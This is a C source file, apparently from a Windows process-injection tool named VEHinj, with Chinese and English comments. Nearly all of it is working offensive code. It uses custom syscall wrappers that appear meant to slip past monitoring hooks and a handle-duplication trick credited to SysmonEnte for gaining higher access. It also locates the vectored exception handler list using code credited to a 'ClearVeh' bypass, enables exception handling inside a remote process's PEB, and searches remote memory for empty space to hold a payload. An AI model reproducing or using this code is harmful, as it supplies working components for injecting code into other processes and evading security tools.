#include "VEHinj.h"

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo);
NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);

FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString宏 其余一致
	_Out_ PUNICODE_STRING DestinationString,
	_In_opt_z_ PCWSTR SourceString
)
{
	if (SourceString)
		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(SFwcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
	else
		DestinationString->MaximumLength = DestinationString->Length = 0;
	DestinationString->Buffer = (PWCH)SourceString;
}

FORCEINLINE VOID SFRtlInitAnsiString( // 与上个函数同理
	_Out_ PANSI_STRING DestinationString,
	_In_opt_z_ PCSTR SourceString
)
{
	if (SourceString)
		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)SFstrlen(SourceString)) + sizeof(ANSI_NULL);
	else
		DestinationString->MaximumLength = DestinationString->Length = 0;

	DestinationString->Buffer = (PCHAR)SourceString;
}

// 输出DEBUG字符串
void PrintDbgA(char* message) {
#ifdef DEBUG
	WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), message, (UINT)SFstrlen(message), NULL, NULL);
#endif
}

void PrintDbgW(wchar_t* message) {
#ifdef DEBUG
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), message, (UINT)SFwcslen(message), NULL, NULL);
#endif
}

// 错误处理
void ErrExit() {
#ifdef DEBUG
	DbgBreakPoint();
#endif
	ExitProcess(0);
}

// 进程名转换PID
// Convert Process Name to PID
DWORD ConvertProcNameToPid(wchar_t* ProcName) {
	ULONG bufferSize = 1024 * 1024;
	PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
	ULONG returnLength = 0;
	SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && SFwcsstr(pInfo->ImageName.Buffer, ProcName)) {
			DWORD pid = (DWORD)pInfo->UniqueProcessId;
			HeapFree(GetProcessHeap(), NULL, buffer);
			return pid;
		}
		if (pInfo->NextEntryOffset == 0) {
			break;
		}
		pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
	}
	HeapFree(GetProcessHeap(), NULL, buffer);
	return 0;
}

// 句柄提权漏洞 详见 https://github.com/codewhitesec/SysmonEnte/
// Handle Elevation Vulnerability
HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes) {
	HANDLE hDupPriv = NULL;
	HANDLE hHighPriv = NULL;
	ULONG options = 0;
	SFNtDuplicateObject((HANDLE)(LONG_PTR)-1, hProcess, (HANDLE)(LONG_PTR)-1, &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
	SFNtDuplicateObject(hDupPriv, (HANDLE)(LONG_PTR)-1, (HANDLE)(LONG_PTR)-1, &hHighPriv, DesiredAccess, HandleAttributes, options);
	return hHighPriv;
}

// 获取本地kernel32.dll入口点地址
// Obtain the entry point address of local kernel32.dll
PVOID GetLocalKernel32EntryPoint()
{
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	ULONG retLen = 0;
	SFNtQueryInformationProcess((HANDLE)(LONG_PTR)-1, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

	PPEB peb = (PPEB)pbi.PebBaseAddress;
	if (!peb || !peb->Ldr)
		return NULL; // Err: 读取PEB或LDR失败

	PPEB_LDR_DATA ldr = peb->Ldr;
	PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
	PLIST_ENTRY node = head->Flink;

	static const WCHAR target[] = L"KERNEL32.DLL";
	size_t targetLen = (sizeof(target) / sizeof(target[0])) - 1; // 不含终止符

	while (node != head)
	{
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(node, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		UNICODE_STRING* baseName = &entry->BaseDllName;
		if (baseName->Buffer && baseName->Length)
		{
			USHORT nameLen = baseName->Length / (USHORT)sizeof(WCHAR);
			if ((size_t)nameLen == targetLen)
			{
				BOOLEAN equal = TRUE;
				for (size_t i = 0; i < targetLen; ++i)
				{
					if (baseName->Buffer[i] != target[i]) {
						equal = FALSE;
						break;
					}
				}
				if (equal)
				{
					PBYTE imageBase = (PBYTE)entry->DllBase;
					PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
					if (dos->e_magic != IMAGE_DOS_SIGNATURE)
						return NULL; // Err: 非法的DOS头
					PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(imageBase + dos->e_lfanew);
					if (nt->Signature != IMAGE_NT_SIGNATURE)
						return NULL; // Err: 非法的NT头
					DWORD rva = nt->OptionalHeader.AddressOfEntryPoint;
					return (PVOID)(imageBase + rva);
				}
			}
		}
		node = node->Flink;
	}

	return NULL; // Err: 未找到kernel32.dll
}



typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN int ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef HRESULT(WINAPI* pRtlEncodeRemotePointer)(_In_ HANDLE ProcessToken, _In_opt_ PVOID Ptr, _Out_ PVOID* EncodedPtr);

//Get address and size of a section within NTDLL (via LdrGetDllHandle)
BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize) {
	PVOID hNtdll = NULL;
	UNICODE_STRING usNtdll;
	SFRtlInitUnicodeString(&usNtdll, L"ntdll.dll");
	NTSTATUS status = LdrGetDllHandle(NULL, NULL, &usNtdll, &hNtdll);
	if (hNtdll == NULL) {
		return FALSE;
	}

	PIMAGE_DOS_HEADER ntdllDos = (PIMAGE_DOS_HEADER)hNtdll;
	PIMAGE_NT_HEADERS ntdllNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + ntdllDos->e_lfanew);
	for (WORD i = 0; i < ntdllNt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntdllNt) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		if (!SFstrcmp((char*)sectionHeader->Name, sectionName)) {
			*sectionVa = (PVOID)((ULONG_PTR)hNtdll + sectionHeader->VirtualAddress);
			*sectionSize = sectionHeader->Misc.VirtualSize;
		}
	}
	return TRUE;
}

//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
PVOID findLdrpVectorHandlerList(PVOID VEH)
{
	BOOL found = FALSE;

	if (VEH == NULL)
		return NULL;

	PLIST_ENTRY next = ((PLIST_ENTRY)VEH)->Flink;

	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (GetNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != VEH)
		{
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID)((ULONG_PTR)sectionVa + sectionSz)) {
				break;
			}
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}
			next = next->Flink;
		}
	}

	return found ? next : NULL;
}

//Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
BOOL EnableRemoteVEH(HANDLE hProcess) {
	PROCESS_BASIC_INFORMATION processInfo = { 0 };
	ULONG returnLength = 0;
	SFNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(processInfo), &returnLength);
	//Read the PEB from the remote process
	PEB2 peb_copy;
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		return FALSE;
	}
	//Enable VEH in our local copy and write it to the remote process
	peb_copy.u2.CrossProcessFlags = 0x4;
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesWritten);
	if (bytesWritten == 0) {
		return FALSE;
	}
	//Reread the remote PEB to ensure that we did enable VEH
	bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), &bytesRead);
	if (bytesRead == 0) {
		return FALSE;
	}
	if (peb_copy.u2.CrossProcessFlags & 0x4) {
		return TRUE;
	}
	return FALSE;
}

// 扫描远程进程指定区域 查找满足对齐要求且长度为holeSize的连续零字节空洞
PVOID FindZeroHoleInRemote(
	HANDLE hProcess, // 目标进程句柄
	PVOID regionBase, // 指定区域基址
	SIZE_T regionSize, // 指定区域长度
	SIZE_T holeSize, // 需求空洞长度
	SIZE_T alignment // 对齐要求
) {
	ULONG_PTR start = (ULONG_PTR)regionBase;
	ULONG_PTR end = start + regionSize;
	ULONG_PTR current = start;
	BYTE buffer[0x2000];
	SIZE_T bufferCap = sizeof(buffer);
	SIZE_T zeroRun = 0;
	ULONG_PTR zeroRunStart = 0;
	while (current < end) {
		// 查询当前页的保护 跳过只读页
		MEMORY_BASIC_INFORMATION mbi;
		SIZE_T qsz = 0;
		SFNtQueryVirtualMemory(hProcess, (PVOID)current, MemoryBasicInformation, &mbi, sizeof(mbi), &qsz);
		if (qsz == 0) {
			ULONG protect = mbi.Protect & 0xFF;
			if (!(protect == PAGE_READWRITE || protect == PAGE_EXECUTE_READWRITE || protect == PAGE_WRITECOPY || protect == PAGE_EXECUTE_WRITECOPY)) {
				current = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
				zeroRun = 0;
				continue;
			}
		}
		SIZE_T toRead = (SIZE_T)((end - current) < bufferCap ? (end - current) : bufferCap);
		SIZE_T bytesRead = 0;

		SFNtReadVirtualMemory(hProcess, (PVOID)current, buffer, toRead, &bytesRead);
		if (bytesRead == 0) {
			zeroRun = 0;
			current += toRead;
			continue;
		}
		for (SIZE_T i = 0; i < bytesRead; i++) {
			if (buffer[i] == 0) {
				if (zeroRun == 0) {
					zeroRunStart = current + i;
				}
				zeroRun++;

				if (zeroRun >= holeSize) {
					ULONG_PTR aligned = (zeroRunStart + (alignment - 1)) & ~(alignment - 1);
					ULONG_PTR coveredEnd = current + i + 1;
					if (aligned + holeSize <= coveredEnd) {
						return (PVOID)aligned;
					}
				}
			}
			else {
				zeroRun = 0;
			}
		}
		current += bytesRead;
	}
	return NULL; // Err: 未找到内存空洞
}
